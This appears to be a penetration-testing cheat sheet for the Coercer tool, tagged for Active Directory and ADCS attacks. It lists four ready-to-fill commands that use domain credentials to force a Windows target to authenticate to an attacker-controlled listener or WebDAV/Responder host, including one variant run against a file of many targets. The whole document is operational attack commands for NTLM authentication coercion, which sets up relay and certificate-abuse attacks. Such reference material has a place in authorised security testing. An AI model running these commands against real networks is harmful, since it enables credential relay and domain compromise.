# coercer

% adcs, certificate, windows, Active directory, template

## coercer - try each method no pause
#plateform/linux #target/remote #cat/ATTACK
```
Coercer coerce -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> <targetIp> --always-continue
```

## coercer - try each method to coerce
#plateform/linux #target/remote #cat/RECON
```
Coercer coerce -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> <targetIp> 
```

## coercer - Webdav
#plateform/linux #target/remote #cat/RECON
```
Coercer coerce -d '<domain>' -u '<user>' -p '<password>' --webdav-host '<ResponderMachineName>' <targetIp> 
```

## coercer - List vulns many targets
#plateform/linux #target/remote #cat/RECON
```
Coercer coerce -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> --targets-file <PathToTargetFile> 
```